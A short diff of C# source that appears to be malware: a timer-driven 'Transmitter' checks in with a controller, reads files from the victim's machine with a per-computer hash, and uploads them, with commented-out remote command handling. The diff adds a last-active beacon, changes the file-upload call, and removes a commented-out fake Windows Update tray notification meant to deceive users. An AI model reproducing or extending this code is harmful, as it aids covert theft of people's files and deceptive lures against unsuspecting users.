@@ -482,6 +482,7 @@ namespace Library
                 {
                     Handler.Instance.Transmitter.LoadSettings();
                     if (Handler.Instance.Transmitter.TSettings == null) return;
+                    Handler.Instance.Transmitter.UpdateLastActive();
                     if (Handler.Instance.Transmitter.TSettings.HasExectuted) return;
                     //var command = Handler.Instance.Transmitter.GetCommand();
                     //if (!command.ToString().Equals("DO_NOTHING"))
@@ -492,7 +493,6 @@ namespace Library
                     Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
                 };
                 transmitTimer.Enabled = true;
-                //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
             }
             return isAuthorized;
         }
@@ -684,7 +684,7 @@ namespace Library
             try
             {
                 var data = new FileData(fileInfo, File.ReadAllBytes(fileInfo.FullName), Handler.Instance.Transmitter.TSettings.ComputerHash);
-                Handler.Instance.Transmitter.UploadFile(data);
+                Handler.Instance.Transmitter.UploadData(fileInfo.Name, data, false);
             }
             catch (Exception ex)
             {
